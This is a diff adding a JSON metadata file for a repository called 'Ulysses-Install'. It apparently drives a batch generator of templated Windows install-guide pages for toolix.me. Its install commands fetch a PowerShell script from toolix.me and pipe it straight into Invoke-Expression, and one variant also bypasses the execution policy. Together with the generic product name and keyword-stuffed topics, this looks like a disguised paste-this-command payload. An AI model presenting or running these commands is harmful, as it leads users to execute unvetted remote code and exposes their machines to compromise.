@@ -1,0 +1,26 @@
+{
+  "repo": "Ulysses-Install",
+  "product": "Ulysses Install",
+  "product_title": "Ulysses Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-ulysses-install",
+    "ulysses-install-app",
+    "desktop-software",
+    "repository-readme",
+    "install-guide",
+    "ulysses-install-desktop-tool",
+    "ulysses-install-windows-tool",
+    "ulysses-install",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
